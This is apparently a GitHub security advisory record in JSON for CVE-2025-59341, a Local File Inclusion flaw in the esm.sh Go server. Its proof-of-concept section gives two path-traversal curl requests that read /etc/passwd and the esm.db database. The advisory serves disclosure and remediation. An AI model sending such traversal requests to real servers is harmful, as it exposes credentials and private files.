{
  "Severity": "HIGH",
  "UpdatedAt": "2025-09-17T18:39:21Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/esm-dev/esm.sh"
  },
  "Advisory": {
    "DatabaseId": 312565,
    "Id": "GSA_kwCzR0hTQS00OXB2LWd3eHAtNTMycs4ABMT1",
    "GhsaId": "GHSA-49pv-gwxp-532r",
    "References": [
      {
        "Url": "https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59341"
      },
      {
        "Url": "https://github.com/esm-dev/esm.sh/commit/492de92850dd4d350c8b299af541f87541e58a45"
      },
      {
        "Url": "https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168"
      },
      {
        "Url": "https://pkg.go.dev/vuln/GO-2025-3962"
      },
      {
        "Url": "https://github.com/advisories/GHSA-49pv-gwxp-532r"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-49pv-gwxp-532r"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-59341"
      }
    ],
    "Description": "## Summary\n\nA Local File Inclusion (LFI) issue was identified in the esm.sh service URL handling. An attacker could craft a request that causes the server to read and return files from the host filesystem (or other unintended file sources).\n\n**Severity:** High â€” LFI can expose secrets, configuration files, credentials, or enable further compromise.\n**Impact:** reading configuration files, private keys, environment files, or other sensitive files; disclosure of secrets or credentials; information leakage that could enable further attacks.\n\nVulnerable code snippet is in this file: https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168\n\n---\n\n## Proof of Concept\n\n1. Using this default config file that I copy from the repo, the server is running at  `http://localhost:9999` with this command `go run server/esmd/main.go --config=config.json`\n\n\n```json\n{\n  \"port\": 9999,\n  \"npmRegistry\": \"https://registry.npmjs.org/\",\n  \"npmToken\": \"******\"\n}\n\n```\n\n2. Trigger the LFI vulnerability by sending this command below to read a local file\n\n```bash\n# read /etc/passwd\ncurl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1\u0026module=1'\n\n# or read the database esm.db file\ncurl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../esm.db?raw=1\u0026module=1'\n```\n\n\u003cimg width=\"3338\" height=\"1906\" alt=\"poc-image\" src=\"https://github.com/user-attachments/assets/f3721e5d-a09c-4227-960a-35279ff52811\" /\u003e\n\n\n---\n\n## Remediation\n\nSimply remove any `..` in the URL path before actually process the file. See more details in [this guide](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)\n\n## Credits\n\n- [Ai Ho (Jessie)](https://github.com/j3ssie)\n- [CL Yang](https://github.com/A11riseforme)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-17T18:39:20Z",
    "Severity": "HIGH",
    "Summary": "esm.sh has File Inclusion issue",
    "UpdatedAt": "2025-09-26T16:14:28Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 136"
    }
  ]
}